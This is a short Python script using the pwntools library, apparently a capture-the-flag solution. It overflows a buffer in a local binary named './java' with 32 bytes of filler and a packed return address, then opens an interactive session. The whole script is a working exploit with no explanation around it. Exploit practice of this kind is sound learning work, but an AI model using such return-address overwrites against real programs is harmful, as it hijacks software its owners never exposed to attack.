from pwn import*

target_address = p64(0x4007A2) 
garbage = b'java' + b'a'*28 
msgin = garbage + target_address 
p = process('./java') 
p.sendline(msgin) 
p.interactive() 
